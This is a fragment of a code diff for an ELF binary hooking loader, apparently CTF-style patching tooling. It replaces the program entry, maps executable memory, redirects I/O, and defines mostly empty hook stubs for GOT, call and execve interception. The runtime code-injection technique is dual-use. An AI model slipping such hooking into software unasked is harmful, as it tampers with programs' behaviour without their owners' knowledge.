+    g_patch_code_slot = (PATCH_CODE_SLOT*)my_mmap((void*)(get_elf_base() - 0x100000),UP_PADDING(MAX_PATCH_NUM*sizeof(g_patch_code_slot),0x1000),PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
+    if(g_patch_code_slot<=0) {
+        g_patch_code_slot = NULL;
+        g_patch_code_index = 0;
+    }
+    else{
+        g_patch_code_index = 0;
+    }
+}
+
+IN_LINE void dynamic_hook_process(Elf_Ehdr* ehdr,void* first_instruction){
+    init_hook_env(first_instruction);
+    process_hook(ehdr);
+    //dynamic_hook_process_mmap();
+    //dynamic_hook_process_execve();
+}
+
+
+void _start(LIBC_START_MAIN_ARG,void* first_instruction,LOADER_STAGE_THREE* three_base_tmp
+) {
+    char *stack_base = 0;
+    char **ev = &UBP_AV[ARGC + 1];
+    int i = 0;
+    char libc_start_main_str[] ={"__libc_start_main"};
+    char* target_entry = lookup_symbols(libc_start_main_str);
+    my_memcpy(&g_loader_param,three_base_tmp,sizeof(LOADER_STAGE_THREE));
+    g_errno_handler = NULL;
+    while (ev[i] != NULL)
+        i++;
+    if (i >= 1)
+        stack_base = (char *) UP_PADDING((long) ev[i - 1], 0x1000);
+    else
+        stack_base = (char *) UP_PADDING((long) ev[i], 0x1000);
+
+    //parent should die before child
+    start_io_redirect(target_entry,stack_base);
+    dynamic_hook_process((Elf_Ehdr*)((char*)three_base_tmp+sizeof(LOADER_STAGE_THREE)),first_instruction);
+    destory_patch_data();
+}
+
+/*total four type hook support
+* 1. __hook_elf_addr
+* 2. __hook_got_addr
+* 3. __hook_lib_addr
+* 4. __hook_call_addr
+*/
+
+
+static void __hook_elf_0xfffffff(char* buf,unsigned int length){
+
+}
+
+static void __hook_call_0x08048785(int flag,char* buf){
+
+}
+
+static char* __hook_got_0x080484D0_malloc(int length){
+
 }
 
 static int __hook_dynamic_execve(char *path, char *argv[], char *envp[]){
@@ -1739,76 +2124,4 @@ static int __hook_dynamic_execve(char *path, char *argv[], char *envp[]){
     }
     //my_execve(path,(char**)argv,(char**)envp);
     return 0;
-}
-
-IN_LINE void dynamic_hook_process_execve(){
-    char execve_str[] ={"execve"};
-    void* hook_handler = (void*)__hook_dynamic_execve;
-    char* execve_handler = lookup_symbols(execve_str);
-    if(execve_handler==NULL)
-        return;
-    dynamic_hook_function(execve_handler,hook_handler);
-}
-
-
-IN_LINE void init_hook_env(void* first_instruction){
-    g_elf_base = DOWN_PADDING((char*)first_instruction-PATCH_FIRT_ENTRY,0x1000);
-    g_patch_code_slot = (PATCH_CODE_SLOT*)my_mmap(g_elf_base - 0x100000,UP_PADDING(MAX_PATCH_NUM*sizeof(g_patch_code_slot),0x1000),PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
-    if(g_patch_code_slot<=0) {
-        g_patch_code_slot = NULL;
-        g_patch_code_index = 0;
-    }
-    else{
-        g_patch_code_index = 0;
-    }
-}
-
-IN_LINE void dynamic_hook_process(void* first_instruction){
-    init_hook_env(first_instruction);
-    dynamic_hook_process_mmap();
-    dynamic_hook_process_execve();
-}
-
-IN_LINE void destory_patch_data(){
-    my_munmap(PATCH_DATA_MMAP_FILE_BASE,UP_PADDING(PATCH_DATA_MMAP_FILE_SIZE,0x1000));
-}
-
-static void hook_start(LIBC_START_MAIN_ARG, int(*__libc_start_main)(LIBC_START_MAIN_ARG_PROTO),void* first_instruction) {
-    char *stack_base = 0;
-    char libc_start_main_str[] ={"__libc_start_main"};
-    char* target_entry = lookup_symbols(libc_start_main_str);
-    char **ev = &UBP_AV[ARGC + 1];
-    int i = 0;
-    g_errno_handler = NULL;
-    while (ev[i] != NULL)
-        i++;
-    if (i >= 1)
-        stack_base = (char *) UP_PADDING((long) ev[i - 1], 0x1000);
-    else
-        stack_base = (char *) UP_PADDING((long) ev[i], 0x1000);
-    destory_patch_data();
-    //parent should die before child
-    start_io_redirect(target_entry, stack_base);
-    dynamic_hook_process(first_instruction);
-    __libc_start_main(MAIN,ARGC,UBP_AV,INIT,FINI,RTLD_FINI,STACK_END);
-}
-
-/*total four type hook support
-* 1. __hook_elf_addr
-* 2. __hook_got_addr
-* 3. __hook_lib_addr
-* 4. __hook_call_addr
-*/
-
-
-void __hook_elf_0xfffffff(char* buf,unsigned int length){
-
-}
-
-void __hook_call_0x08048785(int flag,char* buf){
-
-}
-
-char* __hook_got_0x080484D0_malloc(int length){
-
 }
